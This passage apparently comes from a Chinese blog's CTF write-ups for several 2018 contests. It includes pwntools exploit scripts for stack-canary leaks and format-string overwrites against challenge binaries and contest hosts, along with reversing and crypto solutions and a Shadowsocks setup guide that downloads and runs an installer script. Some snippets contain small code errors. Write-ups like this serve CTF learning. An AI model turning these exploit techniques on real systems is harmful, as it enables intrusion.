sense!!!! :-o \"); else puts(\"You should take more effort to get six sence, and one more challenge!!\"); return 0LL;&#125; checksec 后发现开了Canary。Canary检查失败的时候调用__stack_chk_fail： 12345void__attribute__ ((noreturn))__stack_chk_fail (void) &#123; __fortify_fail (\"stack smashing detected\");&#125; 其中的__fortify_fail打印出了__libc_argv[0]所指向字符串： 123456789void__attribute__ ((noreturn))__fortify_fail (msg) const char *msg; &#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\")&#125;libc_hidden_def (__fortify_fail) 可以通过覆盖__libc_argv[0]实现读取想要的数据，也就是SSP（Stack Smashing Protector） Leak。调试过程中有一个比较容易获取指针的方法： 12assassinq&gt;&gt; p &amp;__libc_argv[0]$1 = (char **) 0x7fffffffe4c8 然后因为 libc 导出了一个符号environ，其值和main函数的第三个参数envp一样。这样的话，只要泄漏出 libc 的基址就可以得到栈上的地址。 三次进程正好分为： 利用 got 表得到 libc 地址 利用 libc 的 environ 得到 stack 地址 计算 flag 地址并输出 exp： 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'local = 1if local: p = process('./guess')else: p = remote('106.75.90.160', 9999)elf = ELF('./guess')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')buf = 0x7fffffffe4d0argv_0 = 0x7fffffffe5f8offset1 = argv_0 - getsoffset2 = 0x7ffd12119a88 - 0x7ffd12119920gets_got = elf.got['gets'] # 0x602058# got ==&gt; libcp.recvuntil('flag\\n')payload = 'A' * offset1 + p64(gets_got)p.sendline(payload)p.recvuntil('***: ')gets_got = u64(sh.recv(6).ljust(8, '\\x00'))print hex(gets_got)libc_base = gets_got - libc.symbols['gets']libc.address = libc_baseprint hex(libc_base)# libc ==&gt; environ ==&gt; stackp.recvuntil('flag\\n')payload = 'A' * offset1 + p64(libc.symbols['environ'])p.sendline(payload)p.recvuntil('***: ')stack = u64(p.recv(6).ljust(8, '\\x00'))print hex(stack)# flagp.recvuntil('flag\\n')payload = 'B' * offset1 + p64(stack - offset2)p.sendline(payload)p.interactive() MISCminified取出 Alpha0 和 Green0 通道的图片后异或得到 flag。 双色块先上 binwalk 得到图片，key 为 ctfer2333。 尝试把 gif 每一个帧拼凑成图片，发现无法得到一个正常的二维码。 再猜测将紫色与绿色色块分别表示 \b1 和 0，先提取出每张图片： 123456789101112131415161718import osfrom PIL import Imagedef main(gif_file): png_dir = 'frame/' img = Image.open(gif_file) try: while True: current = img.tell() print current img.save(png_dir + str(current + 1) + '.png') img.seek(current + 1) except BaseException as e: print eif __name__ == '__main__': gif_file = 'out.gif' main(gif_file) 再读取图片内容，转换成 0 和 1，最后每 8 位转为一个 ascii 字符： 123456789101112131415161718192021222324252627import osfrom PIL import Imagedef main(): png_dir = 'frame/' ret = '' for i in range(0, 24): line = '' for j in range(0, 24): file_name = 'frame/' + str(i * 24 + j + 1) + '.png' x = j * 10 + 5 y = i * 10 + 5 img = Image.open(file_name) img = img.convert('RGB') img_array = img.load() r, g, b = p = img_array[x, y] if g == 255: line += '0' if r == 255 and b == 255: line += '1' if len(line) == 8: ret += chr(int(line, 2)) line = '' print retif __name__ == '__main__': main() 去掉得到的字符串后面的 hhhhh，因为明显不像加密后的内容，\b 尝试 base64 无果后，用 DES 解密，密钥即为一开始得到的 ctfer2333，得到 flag。 welcome解压后用 cat 把所有的文件合并，得到一个 zip 文件，爆破密码得到 flag。 CRYPTOshanghai维吉尼亚解密，在线解密，直接得到 flag。 同时还得到密钥是 icqvigenere。 apl之前 PladCTF 有一道类似的题目，在 xman 的时候也分析过。 apl 最大的特点是从右往左计算。⍵代表右侧的变量，α代表左侧的变量。 一开始给了一长串 base64 字符串，解密后得到 apl： 1&#123;⍵(~⍵)/(&apos;No_Please_continue&apos;)(&apos;Yes,This_is_flag&apos;)&#125;(∊(41(41)0+140)(⎕UCS(&apos;µě»ÕĀ$#Ğ$èáËĞĞĝ`âÞĠ#&quot;!Ġ&quot;KE(©$#Ğ$Q&lt;k&apos;))146)&#123;+/⍺≠33+2⊥(1(5)×8)⍴∊&#123;a≠8↑(1,a←(8⍴2)⊤⍵)&#125;¨2⊥8(+/⍴⍳(7*2)-⌊9.1⌊⍴&apos;FlagIsWhat&apos;)⍴10⊖⊖⌽(∊4(⍴⍴88888)+16)⍴(1+(|¯8)⍴1)⊤⎕UCS(⍵)&#125;&apos;YourFlagIsWhat?&apos; 先分成几个部分： {⍵(~⍵)/(&#39;No_Please_continue&#39;)(&#39;Yes,This_is_flag&#39;)} ==&gt; 输出判断结果 (∊(41(41)0+140)(⎕UCS(&#39;µě»ÕĀ$#Ğ$èáËĞĞĝ`âÞĠ#&quot;!Ġ&quot;KE(©$#Ğ$Q&lt;k&#39;))146) ==&gt; 181 181 140 181 283 187 213 256 36 35 286 36 232 225 203 286 286 285 96 226 222 288 92 120 57 100 35 34 33 288 34 75 69 40 169 36 35 286 36 81 60 107 146 {+/⍺≠33+2⊥(1(5)×8)⍴∊{a≠8↑(1,a←(8⍴2)⊤⍵)}¨2⊥8(+/⍴⍳(7*2)-⌊9.1⌊⍴&#39;FlagIsWhat&#39;)⍴10⊖⊖⌽(∊4(⍴⍴88888)+16)⍴(1+(|¯8)⍴1)⊤⎕UCS(⍵)} ==&gt; 主要加密过程 再通过主要加密过程分析，根据 apl 的特性应该倒着来： (1+(|¯8)⍴1)⊤⎕UCS(⍵) ==&gt; 将 ascii 转换成二进制 (∊4(⍴⍴88888)+16) ==&gt; 20 16，即将右侧的矩阵填充为 20*16 10⊖⊖⌽ ==&gt; 将矩阵的行倒序，列向上 \b 位移 10 8(⍴⍳(7*2)-⌊9.1⌊⍴&#39;FlagIsWhat&#39;) ==&gt; 8 40，即将右侧的矩阵填充为 8*40 2⊥ ==&gt; 将二进制转换成 ascii {a≠8↑(1,a←(8⍴2)⊤⍵)} ==&gt; x ^ (x &gt;&gt; 1) +/⍺≠33+2⊥(1(5)×8) ==&gt; ¨按列读取矩阵，然后经过上一步的移位异或，转为 ascii 码并加上 33 接下来按步骤逆向即可： 1⎕UCS(2⊥(8 40)⍴⌽⊖10⊖(20 16)⍴(8⍴2)⊤(106 202 104 193 192 206 201 100 192 194 204 194 75 200 206 106 193 75 192 201 201 194 75 206 196 98 206 75 196 192 201 108 198 204 100 193 46 40 35 38)) 参考网站https://www.jianshu.com/p/005bda1f8535https://www.anquanke.com/post/id/158386#h3-5https://xz.aliyun.com/t/2665https://mp.weixin.qq.com/s/d4KB9b83D5iiQAfNieqh3whttps://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realismhttps://www.jianshu.com/p/005bda1f8535https://blog.csdn.net/whklhhhh/article/details/81950438https://xz.aliyun.com/t/2614https://blog.csdn.net/whklhhhh/article/details/82217266https://xz.aliyun.com/t/2666","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"2018-noxCTF","slug":"2018-noxCTF","date":"2018-09-10T10:01:51.000Z","updated":"2019-08-26T01:15:02.454Z","comments":true,"path":"2018/09/10/2018-noxCTF/","link":"","permalink":"qianfei11.coding.me/2018/09/10/2018-noxCTF/","excerpt":"记录几道简单题。","text":"记录几道简单题。 RE-GuessTheString把每个 check 分辨出来，然后逐一分析，先判断字符串长度： 1234_BOOL8 __fastcall check1(const char *a1)&#123; return strlen(a1) == 11;&#125; 判断每个字符是否都大于 32： 12345678910__int64 __fastcall check2(_BYTE *s)&#123; char *v2; // [rsp+0h] [rbp-18h] _BOOL4 i; // [rsp+14h] [rbp-4h] v2 = s; for ( i = 1; i &amp;&amp; *v2; i = bigger_than_32(*v2++) ) ; return (unsigned int)i;&#125; 第一个字符不等于 66 且第一个字符与第二个字符的乘积为 3478，可分解质因数求解： 123456789101112131415__int64 __fastcall check3(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( *s == 66 ) &#123; v2 = 0; &#125; else if ( *s * s[1] != 3478 ) &#123; v2 = 0; &#125; return v2;&#125; 前三个数连续异或得到 49: 123456789__int64 __fastcall check4(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( ((unsigned __int8)(s[1] ^ *s) ^ (unsigned __int8)s[2]) != 49 ) v2 = 0; return v2;&#125; 第四个数大于第三个数，但是两者平方和相等，显然是溢出，在计算中通过模 256（即 0xFF）来实现： 12345678910111213141516__int64 __fastcall check5(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( s[3] &gt; s[2] ) &#123; if ( s[2] * s[2] != s[3] * s[3] ) v2 = 0; &#125; else &#123; v2 = 0; &#125; return v2;&#125; 接下来还出现了一个检查素数的函数： 1234567891011121314151617181920212223__int64 __fastcall check_prime(char c)&#123; signed int i; // [rsp+Ch] [rbp-8h] unsigned int v3; // [rsp+10h] [rbp-4h] v3 = 1; if ( (unsigned __int8)c &gt; 1u ) &#123; if ( (unsigned __int8)c &gt; 2u ) &#123; for ( i = 2; v3 &amp;&amp; i &lt; (unsigned __int8)c; ++i ) &#123; if ( !((unsigned __int8)c % i) ) v3 = 0; &#125; &#125; &#125; else &#123; v3 = 0; &#125; return v3;&#125; 第五和第六个字符相互异或等于 126： 1234567891011121314151617181920212223__int64 __fastcall check6(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( (unsigned int)check_prime(s[4]) ) &#123; if ( (unsigned int)check_prime(s[5]) ) &#123; if ( ((unsigned __int8)s[4] ^ (unsigned __int8)s[5]) != 126 ) v2 = 0; &#125; else &#123; v2 = 0; &#125; &#125; else &#123; v2 = 0; &#125; return v2;&#125; 第七个字符的 1/2 是素数，且第七个字符等于第六个字符减去 42 的两倍： 12345678910111213141516__int64 __fastcall check7(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( (unsigned int)check_prime(s[6] / 2) ) &#123; if ( s[6] != 2 * (s[5] - 42) ) v2 = 0; &#125; else &#123; v2 = 0; &#125; return v2;&#125; 第八个数字在(47, 57]范围内，右移两位后乘四等于本身： 1234567891011__int64 __fastcall check8(char *s)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( s[7] &lt;= 47 || s[7] &gt; 57 ) v2 = 0; if ( 4 * (char)(s[7] &gt;&gt; 2) != s[7] ) v2 = 0; return v2;&#125; 传入 \b 数字与第八个字符异或得到第九个字符： 1234_BOOL8 __usercall check9@&lt;rax&gt;(unsigned __int8 a1@&lt;efl&gt;, __int64 a2, char *s)&#123; return s[8] == (a1 ^ (unsigned __int8)s[7]);&#125; 两倍关系： 123456789__int64 __fastcall check10(char *a1)&#123; unsigned int v2; // [rsp+14h] [rbp-4h] v2 = 1; if ( 2 * a1[8] != a1[9] ) v2 = 0; return v2;&#125; 计算得出第十一个数字： 123456789101112_BOOL8 __fastcall check11(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, char *a8)&#123; __int64 v8; // rcx __int16 sum; // ax v8 = (unsigned __int8)a8[9]; sum = 0; do sum += v8--; while ( v8 ); return a8[10] == HIBYTE(sum) * (_BYTE)sum;&#125; 逻辑相对比较常规，但做下来有些耗时。最后写出脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647primes = []for i in range(2, 256): for j in range(2, i): if i % j == 0: break else: primes.append(i)s = 11 * [0]# s[0], s[1] = 37, 94 # %^Jv!_j0\"Dz ==&gt; wrongs[0], s[1] = 47, 74 # /JTl!_j0\"Dz ==&gt; rightassert(s[0] * s[1] == 3478)s[2] = s[0] ^ s[1] ^ 49for i in range(s[2] + 1, 256): if i * i % 256 == s[2] * s[2] % 256: s[3] = i breakdef get456(): for i in primes: for j in primes: if i &gt; 32 and j &gt; 32 and (i ^ j) % 256 == 126: if j - 42 in primes and 2 * j &lt; 256: return (i, j, 2 * (j - 42))s[4], s[5], s[6] = get456()for i in range(48, 58): if 4 * (i &gt;&gt; 2) == i: s[7] = i breaks[8] = 0x12 ^ s[7]s[9] = 2 * s[8]s[10] = 0x7Afor c in s: assert(c &gt; 32)print(''.join(map(chr, s))) 据说这里可以符号执行用 angr 做。 MISC-Blind Datexxd一下文件头，根据 jpeg 文件头特征可以发现每四字节被倒过来了： 1234567891011~ &gt; xxd BlindDate.jpeg | head00000000: e0ff d8ff 464a 1000 0100 4649 6000 0101 ....FJ....FI`...00000010: 0000 6000 2200 e1ff 6669 7845 4d4d 0000 ..`.\"...fixEMM..00000020: 0000 2a00 0100 0800 0300 1201 0100 0000 ..*.............00000030: 0000 0100 0000 0000 1100 ecff 6b63 7544 ............kcuD00000040: 0001 0079 0000 0004 ff00 004b 687e 03e1 ...y.......Kh~..00000050: 3a70 7474 736e 2f2f 6f64 612e 632e 6562 :pttsn//oda.c.eb00000060: 782f 6d6f 312f 7061 002f 302e 7078 3f3c x/mo1/pa./0.px?&lt;00000070: 656b 6361 6562 2074 3d6e 6967 bfbb ef22 ekcaeb t=nig...\"00000080: 6469 2022 3557 223d 704d 304d 6968 6543 di \"5W\"=pM0MiheC00000090: 6572 7a48 544e 7a53 636b 7a63 3f22 6439 erzHTNzSckzc?\"d9 用脚本过逆回来： 12345678910f = open('BlindDate.jpeg', 'rb')s = f.read()f.close()data = ''for i in range(0, len(s), 4): data += s[i:i + 4][::-1]new_f = open('re_BlindData.jpeg', 'wb')new_f.write(data) strings一下新文件，发现一串 base64 字符串： 1Li4gICAuICAuLiAgLi4gICAuICAuLiAgLi4gICAuICAuLiAgLiAgLi4NCi4gICAgLiAgIC4gICAgICAgLiAgICAgIC4gICAgLiAgIC4gIC4gIA0KICAgIC4uICAgICAgICAgIC4uICAgICAgLiAgIC4uICAgICAgLiAgLgPK 解开后发现是盲文： 123.. . .. .. . .. .. . .. . ... . . . . . . . .. .. . .. . . 翻译一下之后是：F4C3P4LM binwalk一下新文件，分解出一个带密码的 7z 压缩文件。把上面的字符串作为密码解开，得到 flag 文本，是 brainfuck： 1++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++.+.+++++++++.&lt;---.+++++++++++++++++.--------------.&gt;+++.&lt;+++++++++++++++++.&lt;++++++++++++++++++.&gt;&gt;------.---------.--------.-----.++++++++++++++++++++++++++.&lt;&lt;.&gt;&gt;----.&lt;++++++++.+++.&gt;---------.&lt;&lt;+.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.&gt;-----.&lt;+.&gt;.+++.&gt;--------.&lt;&lt;---.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.++++++++++++.&gt;&gt;+++++++++.&lt;&lt;&lt;++++++++++++++++++++++. 解密得到 flag：noxCTF{W0uld_y0u_bl1nd_d4t3_4_bl1nd_d4t3?} PWN-believeMe做出的第一道格式化字符串。拿到题目先 \bfile\b 一下，然后再看看开了什么保护： 123456789[noxCTF-believeMe] file believeMe 1:36:01believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped[noxCTF-believeMe] checksec believeMe 1:36:06[*] '/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 然后拖进 ida 中查看： 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[40]; // [esp+14h] [ebp-34h] unsigned int v5; // [esp+3Ch] [ebp-Ch] v5 = __readgsdword(0x14u); puts(aSomeoneToldMeT); fflush(stdout); fgets(s, 39, stdin); s[strcspn(s, \"\\n\")] = 0; printf(s); fflush(stdout); return 0;&#125; main 函数中对字符串长度做了限制，并且存在明显的格式化字符串漏洞。然后很容易发现有一个奇怪的函数noxFlag： 12345678910111213141516171819202122232425void __noreturn noxFlag()&#123; char i; // [esp+Bh] [ebp-Dh] FILE *stream; // [esp+Ch] [ebp-Ch] stream = fopen(\"flag.txt\", \"r\"); puts(s); fflush(stdout); if ( stream ) &#123; for ( i = fgetc(stream); i != -1; i = fgetc(stream) ) &#123; putchar(i); fflush(stdout); &#125; fflush(stdout); fclose(stream); &#125; else &#123; puts(\"Can't read file \\n\"); fflush(stdout); &#125; exit(0);&#125; 由于题目中提到环境是不开启 ASLR 的，那么这道题的思路就很明确：通过格式化字符串，泄漏出 main 函数 ret 的地址，修改为noxFlag的地址，得到flag.txt的内容。 gdb 调试，通过查看栈上的内容得到 \b\b 字符串的 offset： 1234567891011gdb-peda$ stack 200000| 0xffffceb0 --&gt; 0xffffced4 (&quot;AAAA&quot;)0004| 0xffffceb4 --&gt; 0x804890c --&gt; 0xa (&apos;\\n&apos;)0008| 0xffffceb8 --&gt; 0xf7fb35a0 --&gt; 0xfbad22880012| 0xffffcebc --&gt; 0x7f170016| 0xffffcec0 --&gt; 0xffffffff0020| 0xffffcec4 --&gt; 0x2f (&apos;/&apos;)0024| 0xffffcec8 --&gt; 0xf7e0ddc8 --&gt; 0x2b76 (&apos;v+&apos;)0028| 0xffffcecc --&gt; 0xffffcfb4 --&gt; 0xffffd18d (&quot;/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe&quot;)0032| 0xffffced0 --&gt; 0x80000036| 0xffffced4 (&quot;AAAA&quot;) 关于 ret 的地址，也通过在栈上的观察： 1234567890084| 0xffffce94 --&gt; 0xffffceb0 --&gt; 0x10088| 0xffffce98 --&gt; 0x00092| 0xffffce9c --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;: add esp,0x10)0096| 0xffffcea0 --&gt; 0xf7fb3000 --&gt; 0x1b1db0--More--(25/50)0100| 0xffffcea4 --&gt; 0xf7fb3000 --&gt; 0x1b1db00104| 0xffffcea8 --&gt; 0x00108| 0xffffceac --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;: add esp,0x10)0112| 0xffffceb0 --&gt; 0x1 可以看到本地 \bret 的地址即为0xffffceac，然后需要利用漏洞，泄漏出远程的地址。仔细观察发现 offset 为 84 和 112 处的联系，即只需要泄漏出 offset 为 84 的 \b 内容，再将结果减去 4 即能 \b 得到远程服务器上 ret 的地址。 格式化字符串漏洞的 payload 还可以利用pwntools中的一个函数fmtstr_payload，用于自动生成格式化字符串。fmtstr_payload有三个参数：第一个参数是int，用于表示取参数的偏移个数；第二个参数是字典，字典的意义是往key的地址，写入value的值；第三个参数write_size，可以改变 payload 的形式，\bbyte对应%hhn，short对应%hn，int对应%n。 最后可以写出 exp： 12345678910111213141516171819from pwn import *# context.log_level = 'DEBUG'local = 0if local: p = process('./believeMe')else: p = remote('18.223.228.52', 13337)flag_addr = 0x0804867Bret_addr = 0xffffdd2c # local: 0xffffd2bcoffset = 9# payload = p32(0xdeadbeef) + '%&#123;&#125;$p'.format(str(offset)) # test offset# payload = '0x%21$08x' # test ret_addr# payload = p32(ret_addr + 2) + p32(ret_addr) + '%2044c%9$hn%32375c%10$hn'payload = fmtstr_payload(offset, &#123;ret_addr:flag_addr&#125;, write_size='short')assert(len(payload) &lt; 39)p.recvuntil('????')# gdb.attach(p, 'b *0x80487d3\\nc')p.sendline(payload)p.interactive() PWN-The Name Calculator\b 又是一道格式化字符串，还涉及到栈溢出。\b 先反编译查看 main 函数： 12345678910111213141516171819202122int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; char buf; // [esp+Ch] [ebp-2Ch] int v4; // [esp+28h] [ebp-10h] unsigned int v5; // [esp+2Ch] [ebp-Ch] v5 = __readgsdword(0x14u); puts(\"What is your name?\"); fflush(stdout); read(0, &amp;buf, 0x20u); fflush(stdin); if ( v4 == 0x6A4B825 ) &#123; secretFunc(); &#125; else &#123; puts(\"I've heard better\"); fflush(stdout); &#125; exit(0);&#125; 查看一下 v4 和 buf 在内存中的位置，发现可以溢出进入secretFunc，看一下这个函数： 123456789101112131415161718192021222324252627282930313233int secretFunc()&#123; unsigned int v0; // eax int *i; // [esp+8h] [ebp-40h] ssize_t v3; // [esp+18h] [ebp-30h] int buf[7]; // [esp+20h] [ebp-28h] unsigned int v5; // [esp+3Ch] [ebp-Ch] void *retaddr; // [esp+4Ch] [ebp+4h] v5 = __readgsdword(0x14u); v0 = 0; do &#123; buf[v0] = 0; ++v0; &#125; while ( v0 &lt; 7 ); retAddr = (int)retaddr; puts(\"Say that again please\"); fflush(stdout); v3 = read(0, buf, 0x1Bu); *((_BYTE *)buf + v3) = 0; fflush(stdin); for ( i = buf; i &lt; (int *)((char *)&amp;buf[-1] + v3); i = (int *)((char *)i + 1) ) *i ^= 0x5F7B4153u; puts(\"Your name was encrypted using the best encryption in the world\"); printf(\"This is your new name: \"); printf((const char *)buf); fflush(stdout); if ( retaddr != (void *)retAddr ) exit(1); return 0;&#125; 中间对输入的 buf 进行了异或，从第一字符开始，步长为 1，每次取 \b 四个字符，\b 转换为 int 型 \b 后与特定数字异或，循环直到倒数第四个字符。后面 buf 这里的 \bprintf明显存在格式化字符串。\b 然后又发现了一个superSecretFunc函数： 123456int superSecretFunc()&#123; printf(\"Here is your flag: \"); fflush(stdout); return system(\"cat flag\");&#125; 大概知道了是通过格式化字符串修改某个 ret 的地址 \b，然后在superSecretFunc这里执行 \bcat flag。回头再看到 main 函数调用了exit，这里就可以通过修改exit的 got 表实现跳转。然后先通过 gdb 调试找到 \b 地址： 12345678gdb-peda$ pdis exitDump of assembler code for function exit@plt: 0x08048470 &lt;+0&gt;: jmp DWORD PTR ds:0x804a024 0x08048476 &lt;+6&gt;: push 0x30 0x0804847b &lt;+11&gt;: jmp 0x8048400End of assembler dump.gdb-peda$ x/wx 0x804a0240x804a024: 0x08048476 查看栈上分布，得到 \b 字符串的偏移： 123456789101112130000| 0xffbc27e0 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;)0004| 0xffbc27e4 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;)0008| 0xffbc27e8 --&gt; 0x1b0012| 0xffbc27ec --&gt; 0xf75badfb (&lt;_IO_puts+347&gt;: add esp,0x10)0016| 0xffbc27f0 --&gt; 0xf75c31d7 (&lt;_IO_new_file_sync+7&gt;: add esi,0x149e29)0020| 0xffbc27f4 --&gt; 0xf770d000 --&gt; 0x1b1db00024| 0xffbc27f8 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;)0028| 0xffbc27fc --&gt; 0x804879a (&lt;main+112&gt;: jmp 0x80487bd &lt;main+147&gt;)0032| 0xffbc2800 (&quot;SA&#123;_&quot;)0036| 0xffbc2804 --&gt; 0x00040| 0xffbc2808 --&gt; 0x20044| 0xffbc280c --&gt; 0xf770d000 --&gt; 0x1b1db00048| 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;) 最后 \b 的 exp： 123456789101112131415161718192021222324252627282930313233from pwn import *# context.log_level = 'DEBUG'local = 1if local: p = process('./CAL')else: p = remote('chal.noxale.com', 5678)def xor_op(s): xor_num = 0x5F7B4153 l = list(s) for i in range(len(l) - 4): t = ''.join(l[i:i + 4]) l[i:i + 4] = list(p32(u32(t) ^ xor_num)) return ''.join(l)offset1 = 28v4 = 0x6A4B825offset2 = 12exit_got = 0x804a024super_addr = 0x08048596# gdb.attach(p, 'b *0x8048656')p.recvuntil('name?')payload1 = 'A' * offset1 + p32(v4)p.send(payload1)p.recvuntil('please')payload2 = xor_op(p32(exit_got) + '%34194c%12$hn')assert(len(payload2) &lt; 0x1B)p.send(payload2)p.interactive() 参考网站https://github.com/OAlienO/CTF/tree/master/2018/noxCTF/Guess-The-Stringhttps://github.com/imthoe/noxCTF/tree/master/BlindDatehttps://www.pwndiary.com/write-ups/noxctf-2018-believeme-write-up-pwn378/https://www.pwndiary.com/write-ups/noxctf-2018-the-name-calculator-write-up-pwn537/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"利用VPS搭建Shadowsocks科学上网","slug":"利用VPS搭建Shadowsocks科学上网","date":"2018-09-08T03:37:55.000Z","updated":"2019-08-26T05:53:53.640Z","comments":true,"path":"2018/09/08/利用VPS搭建Shadowsocks科学上网/","link":"","permalink":"qianfei11.coding.me/2018/09/08/利用VPS搭建Shadowsocks科学上网/","excerpt":"记录一下自己搭小飞机的过程。","text":"记录一下自己搭小飞机的过程。 第一步-租服务器先放一些国外的一些 VPS 提供商：vultr、linode、搬瓦工。我是在 vultr 上租的服务器。 首先注册账号，进入 \b 个人界面后，在 Billing 页面使用 Alipay 充值。 去 Servers 页面，\b 选择服务器的地点，我选了 Los Angeles。 然后选择 os，我的话选了 CentOS。 然后 Size 我是选了$3.5/mo，因为最便宜的$2.5/mo 只支持 ipv6。 然后点击 Deploy Now，过一会儿就可以得到这台服务器的基本信息。 第二步-ssh 远程连接mac 的话我是用的 SSH Shell 来连，如果是 windows 可以用 Putty。 按照给出的信息连一下就行了（\b 端口 22）。 第三步-搭建\b 在服务器上运行一下命令： 123wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.shchmod +x shadowsocks-all.sh./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log 然后按照提示选择脚本，我选了 Shadowsocks-Go，之后 \b 也是无脑跟着指令一步一步进行，安装完成后就会得到 \b： 12345678910111213141516Starting shadowsocks-go (via systemctl): [ OK ]Congratulations, Shadowsocks-Go server install completed!Your Server IP : xxx.xxx.xxx.xxxYour Server Port : xxxxxYour Password : xxxxxxxxxxxYour Encryption Method: xxxxxxxxxxxYour QR Code: (For Shadowsocks Windows, OSX, Android and iOS clients) ss://YWVzLTI1Ni1jZmI6dGVkZHlzdW4uY29tQDE0OS4yNDguNC4yMjg6MTIyOTk=Your QR Code has been saved as a PNG file path: /root/shadowsocks_go_qr.pngWelcome to visit: https://teddysun.com/486.htmlEnjoy it! 第四步-科学上网我把 \b 每个平台上的小飞机都放在我的 github 上了。\b 只要将上面的信息填进去就能科学上网啦。 参考网站https://www.diycode.cc/topics/738","categories":[],"tags":[{"name":"note","slug":"note","permalink":"qianfei11.coding.me/tags/note/"}]},{"title":"2018-安恒杯八月月赛","slug":"2018-安恒杯八月月赛","date":"2018-08-31T14:34:15.000Z","updated":"2019-08-26T01:14:35.667Z","comments":true,"path":"2018/08/31/2018-安恒杯八月月赛/","link":"","permalink":"qianfei11.coding.me/2018/08/31/2018-安恒杯八月月赛/","excerpt":"放暑假玩了几天，慢慢整理这几次比赛。","text":"放暑假玩了几天，慢慢整理这几次比赛。 CRYPTO-爬坡道提示明显是希尔加密，了解一下希尔加密写一下脚本或者在线解密。 123456789101112131415161718192021from numpy import *flag = ''mat_key = mat([[3, 1], [2, 1]])enc = 'mttpjbpexfdzcegtdzeanutg'# pla = 'thehillisveryinteresting'# 字符串转为数字enc1 = []for i in range(len(enc)): enc1.append(ord(enc[i]) - ord('a'))# 计算明文并转化为字符串res = mat_enc * mat_key.Ires = res.reshape(1, len(enc1)).tolist()[0]flag = ''for i in range(len(res)): flag += chr(ord('a') + (int(round(res[i])) % 26))# 输出flagprint flag 最后提交 flag 的 md5 值。 RE-Dig The Way题目里直接给了一个 idb 文件，用 ida 打开分析。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax int result; // eax int v5; // eax char flag; // [esp+11h] [ebp-3Fh] int a[0]; // [esp+28h] [ebp-28h] int a[2]; // [esp+30h] [ebp-20h] int a[4]; // [esp+38h] [ebp-18h] int a[5]; // [esp+3Ch] [ebp-14h] signed int (__cdecl *_func0)(char *, int, int); // [esp+40h] [ebp-10h] int (__cdecl *_func1)(char *, int, int); // [esp+44h] [ebp-Ch] int (__cdecl *_func2)(char *, int, int); // [esp+48h] [ebp-8h] int i; // [esp+4Ch] [ebp-4h] __main(); _func0 = swap; // swap pos _func1 = trans1; // |x + y| - |x| - |y| + 2 _func2 = trans2; // |x| + |y| - |x + y| + 2 v3 = 0; do &#123; *(int *)((char *)&amp;a[0] + v3) = 0; // init array v3 += 4; &#125; while ( v3 &lt; 24 ); printf(\"input flag:\"); scanf(\"%s\", &amp;flag); if ( strcmp(&amp;flag, \"flag&#123;\") &lt; 0 ) // 1.flag head return 0; if ( check(&amp;flag) ) // 2.flag all-misc &#123; a[5] = getValue(&amp;flag); if ( a[5] &gt; 0 ) // make sure only one solution &#123; for ( i = 0; i &lt;= 2; ++i ) &#123; v5 = (*(&amp;_func0 + i))((char *)&amp;a[0], 4, 5); *(&amp;a[0] + i) = v5; a[5] = -a[4]; &#125; if ( a[2] ) // 3.flag key-point &#123; result = 1; &#125; else &#123; puts(\"Congratulations\"); system(\"PAUSE\"); result = 0; &#125; &#125; else &#123; result = 0; &#125; &#125; else &#123; puts(\"check your flag!\"); result = 0; &#125; return result;&#125; 一开始对输入字符串匹配了flag{，之后有多个函数进行的转换。可以看出最重要的有三个函数： check() getValue() _func2 下面就逐一分析。 check()1234567891011121314bool __cdecl check(_BYTE *a1)&#123; if ( (char)a1[7] + (char)a1[6] != (char)a1[8] ) return 0; if ( 